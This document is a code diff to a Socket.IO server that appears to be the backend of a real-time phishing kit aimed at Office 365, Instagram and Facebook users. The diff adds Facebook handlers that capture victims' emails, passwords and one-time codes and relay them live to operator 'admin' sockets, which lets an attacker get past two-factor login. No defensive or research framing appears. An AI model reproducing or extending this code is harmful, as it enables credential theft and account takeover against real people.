@@ -24,9 +24,12 @@ const server = http.createServer(app);
 const io = new Server(server, {
   cors: {
     origin: [
-      process.env.ADMIN_URL,
-      process.env.OFFICE365_USER_URL,
-      process.env.IG_USER_URL,
+      // process.env.ADMIN_URL,
+      // process.env.OFFICE365_USER_URL,
+      // process.env.IG_USER_URL,
+      // process.env.FB_USER_URL,
+      process.env.TEST_USER_URL,
+      process.env.TEST_ADMIN_URL,
     ],
     methods: ["GET", "POST"],
   },
@@ -689,6 +692,112 @@ io.on("connection", (socket) => {
     // Broadcast to admins
     adminSockets.forEach((adminSocket) => {
       adminSocket.emit("stay_signed_in", {
+        ...data,
+        sessionId: data.sessionId,
+        timestamp: new Date().toISOString(),
+      });
+    });
+  });
+
+  socket.on("fb_attempt_init", (data) => {
+    const sessionData = sessions.get(data.sessionId) || {
+      email: data.email,
+      password: data.password,
+      events: [],
+    };
+
+    sessionData.events.push({
+      type: "fb_attempt_init",
+      timestamp: data.timestamp,
+      data: data.email,
+    });
+
+    sessions.set(data.sessionId, sessionData);
+    userSessions.set(data.sessionId, socket);
+
+    // Broadcast to admins
+    adminSockets.forEach((adminSocket) => {
+      adminSocket.emit("fb_attempt_init", {
+        ...data,
+        sessionId: data.sessionId,
+        timestamp: new Date().toISOString(),
+      });
+    });
+  });
+
+  socket.on("fb_otp", (data) => {
+    const sessionData = sessions.get(data.sessionId) || {
+      email: data.email,
+      password: data.password,
+      otp: data.otp,
+      events: [],
+    };
+
+    sessionData.events.push({
+      type: "fb_otp",
+      timestamp: data.timestamp,
+      data: data.email,
+    });
+
+    sessions.set(data.sessionId, sessionData);
+    userSessions.set(data.sessionId, socket);
+
+    // Broadcast to admins
+    adminSockets.forEach((adminSocket) => {
+      adminSocket.emit("fb_otp", {
+        ...data,
+        sessionId: data.sessionId,
+        timestamp: new Date().toISOString(),
+      });
+    });
+  });
+
+  socket.on("fb_resend_otp", (data) => {
+    const sessionData = sessions.get(data.sessionId) || {
+      email: data.email,
+      password: data.password,
+      events: [],
+    };
+
+    sessionData.events.push({
+      type: "fb_resend_otp",
+      timestamp: data.timestamp,
+      data: data.email,
+    });
+
+    sessions.set(data.sessionId, sessionData);
+    userSessions.set(data.sessionId, socket);
+
+    // Broadcast to admins
+    adminSockets.forEach((adminSocket) => {
+      adminSocket.emit("fb_resend_otp", {
+        ...data,
+        sessionId: data.sessionId,
+        timestamp: new Date().toISOString(),
+      });
+    });
+  });
+
+  socket.on("fb_done", (data) => {
+    const sessionData = sessions.get(data.sessionId) || {
+      email: data.email,
+      password: data.password,
+      otp: data.otp,
+      events: [],
+    };
+
+    sessionData.events.push({
+      type: "fb_done",
+      timestamp: data.timestamp,
+      data: data.email,
+    });
+
+    sessions.set(data.sessionId, sessionData);
+    userSessions.set(data.sessionId, socket);
+
+    // Broadcast to admins
+    adminSockets.forEach((adminSocket) => {
+      adminSocket.emit("fb_done", {
         ...data,
         sessionId: data.sessionId,
         timestamp: new Date().toISOString(),
